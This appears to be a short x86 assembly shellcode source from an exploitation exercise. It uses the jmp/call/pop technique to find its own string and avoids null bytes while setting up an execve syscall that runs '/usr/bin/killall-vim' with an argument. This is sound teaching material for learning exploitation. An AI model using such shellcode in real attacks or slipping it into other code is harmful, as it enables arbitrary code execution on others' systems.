#include <sys/syscall.h>

#define STRING	"/usr/bin/killall-vim"
#define STRLEN  16	
#define ARGLEN 3 
#define ARGV	(STRLEN+ARGLEN+2)
#define ARG2  (ARGV+4)
#define ENVP	(ARGV+8)

.globl main
	.type	main, @function

 main:
	jmp	calladdr

 popladdr:
	popl	%esi
	movl	%esi,(ARGV)(%esi)	/* set up argv pointer to pathname */
  mov   $STRLEN, %ebx
  add   %esi,%ebx /* ebx = esi + strlen, and points at next string */
  inc   %ebx /* now it is actually at the head */
  movl  %ebx,(ARG2)(%esi)
	xorl	%eax,%eax		/* get a 32-bit zero value */
	movb	%al,(STRLEN)(%esi)	/* null-terminate our string */
  movb  %al,(STRLEN+ARGLEN+1)(%esi) /* null-terminate the arg */
	movl	%eax,(ENVP)(%esi)	/* set up null envp */


	movb	$SYS_execve,%al		/* syscall arg 1: syscall number */
	movl	%esi,%ebx		/* syscall arg 2: string pathname */
	leal	ARGV(%esi),%ecx		/* syscall arg 2: argv */
	leal	ENVP(%esi),%edx		/* syscall arg 3: envp */
	int	$0x80			/* invoke syscall */

	#xorl	%ebx,%ebx		/* syscall arg 2: 0 */
	#movl	%ebx,%eax
	#inc	%eax			/* syscall arg 1: SYS_exit (1), uses */
					/* mov+inc to avoid null byte */
	#int	$0x80			/* invoke syscall */

 calladdr:
	call	popladdr
	.string	STRING
